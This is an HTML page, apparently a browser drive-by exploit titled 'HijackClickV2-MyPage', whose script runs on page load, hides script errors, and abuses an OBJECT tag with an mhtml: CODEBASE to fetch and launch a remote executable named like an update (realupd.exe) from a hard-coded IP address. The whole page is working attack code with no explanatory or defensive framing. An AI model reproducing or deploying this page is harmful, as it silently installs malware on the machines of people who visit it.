<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  
<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

//-->
</script>

<script>
WaitForDocumentCached_TIME=100;

function LaunchRemoteExe_Step2()
	{
		//One more fresh action is present for more stable performance
		for(i=1;i<=2;i++)	
			w.document.execCommand("Refresh");
	}
	
function LaunchRemoteExe(ExeUrl)	
	{
		w=window.open("about:blank","_blank","width=300 height=400 resizable=yes location=yes");
		w.document.write("<OBJECT NAME='X' CLASSID='CLSID:11111111-1111-1111-1111-111111111113' CODEBASE='mhtml:file://C:\NO_SUCH_MHT.MHT!" + ExeUrl + "'>");
		setTimeout("LaunchRemoteExe_Step2()",WaitForDocumentCached_TIME);
	}

LaunchRemoteExe("http://69.44.153.17/realupd.exe")
  </script>
</head>
<body>
<font size="6"><font size="2"><big><big><big><big>HijackClickV2-MyPage</big></big></big></big><b><i><br>
<br>
</body>
</html>
